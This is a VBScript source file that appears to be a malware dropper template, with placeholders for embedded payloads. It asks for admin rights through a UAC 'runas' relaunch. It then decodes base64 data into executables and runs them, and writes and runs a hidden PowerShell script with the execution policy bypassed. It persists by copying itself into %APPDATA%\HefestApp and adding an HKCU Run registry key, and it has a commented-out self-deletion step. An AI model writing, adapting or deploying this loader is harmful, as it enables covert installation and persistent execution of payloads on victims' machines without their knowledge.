Dim bodyX
bodyX="0102"
Dim selfDel
selfDel="__selfDel"
Dim autorun
autorun="__autorun"
Dim arrFrontData
arrFrontData = Array("__frontData")
Dim arrFrontName
arrFrontName = Array("__frontName")


If Not IsAdmin() Then
    RunElevated()
Else
    MainScriptLogic()
    if autorun = "True" Then
        DoAutoRun
    end if
End If

Function GetFilePath(fileName)
    Dim fso, scriptPath, scriptFolder, fullPath
    Set fso = CreateObject("Scripting.FileSystemObject")
    scriptPath = WScript.ScriptFullName
    scriptFolder = fso.GetParentFolderName(scriptPath)
    fullPath = fso.BuildPath(scriptFolder, fileName)
    Set fso = Nothing
    GetFilePath = fullPath
End Function

Function ExecuteFileAsync(filePath)
    Dim shell, result
    Set shell = CreateObject("WScript.Shell")
    result = shell.Run(filePath, 1, False)
    Set shell = Nothing
    ExecuteFileAsync = result
End Function

Function DecodeBase64ToFile(base64String, outputFilePath)
    Dim xmlDoc
    Set xmlDoc = CreateObject("Msxml2.DOMDocument.3.0")
    
    ' Create an XML element with the base64 string
    Dim node
    Set node = xmlDoc.createElement("base64")
    node.dataType = "bin.base64"
    node.Text = base64String
    
    ' Get the decoded binary data
    Dim binaryData
    binaryData = node.nodeTypedValue
    
    ' Create a binary stream object to save the binary data to a file
    Dim stream
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' adTypeBinary
    stream.Open
    stream.Write binaryData
    
    ' Save the binary stream to the specified output file path
    stream.SaveToFile outputFilePath, 2 ' adSaveCreateOverWrite
    stream.Close
    
    ' Clean up
    Set stream = Nothing
    Set node = Nothing
    Set xmlDoc = Nothing
End Function

Sub MainScriptLogic()

    For i = 0 To UBound(arrFrontName)
        data = arrFrontData(i)
        exe = GetFilePath(arrFrontName(i))
        DecodeBase64ToFile data, exe
        ExecuteFileAsync exe
    Next

    Dim objShell
    Set objShell = CreateObject("WScript.Shell")
    Dim scriptFullPath
    scriptFullPath = WScript.ScriptFullName
    Dim psScriptPath
    psScriptPath = Left(scriptFullPath, Len(scriptFullPath) - 3) & "ps1"
    DecodeBase64ToFile bodyX, psScriptPath
    Dim command
    command = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & psScriptPath & """"
    ' Using Run method with window style 0 to run the command invisibly
    objShell.Run command, 0, True
    ' Delete the PowerShell script file and itself if selfDel is "yes"
    If selfDel = "yes" Then
        'Dim fso
        'Set fso = CreateObject("Scripting.FileSystemObject")
        'If fso.FileExists(psScriptPath) Then
        '    fso.DeleteFile psScriptPath
        'End If   
        ' Schedule self-deletion using cmd and timeout
        'Dim deleteCommand
        'deleteCommand = "cmd /c timeout 2 > NUL & del """ & scriptFullPath & """"
        'objShell.Run deleteCommand, 0, False
        'Set fso = Nothing
    End If
    Set objShell = Nothing
End Sub

Function IsAdmin()
    Dim objWShell, result
    Set objWShell = CreateObject("WScript.Shell")
    result = objWShell.Run("cmd /c net session >nul 2>&1", 0, True)
    IsAdmin = (result = 0)
    Set objWShell = Nothing
End Function

Sub RunElevated()
    Dim objShell
    Set objShell = CreateObject("Shell.Application")
    objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34), "", "runas", 1
    WScript.Quit
End Sub


Sub DoAutoRun()
    Dim fso, shell, scriptPath, destFolder, destPath, registryKey
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set shell = CreateObject("WScript.Shell")
    scriptPath = WScript.ScriptFullName
    destFolder = fso.BuildPath(shell.ExpandEnvironmentStrings("%APPDATA%"), "HefestApp")
    destPath = fso.BuildPath(destFolder, fso.GetFileName(scriptPath))
    CreateFolder fso, destFolder
    CopyScript fso, scriptPath, destPath
    SetAutorun shell, destPath
    Set shell = Nothing
    Set fso = Nothing
End Sub

Sub CreateFolder(fso, folderPath)
    If Not fso.FolderExists(folderPath) Then
        fso.CreateFolder(folderPath)
    End If
End Sub

Sub CopyScript(fso, sourcePath, destinationPath)
    fso.CopyFile sourcePath, destinationPath, True
End Sub

Sub SetAutorun(shell, scriptPath)
    Dim registryKey, registryValue
    registryKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\"
    registryValue = "HefestAppVbs"
    shell.RegWrite registryKey & registryValue, """" & scriptPath & """", "REG_SZ"
End Sub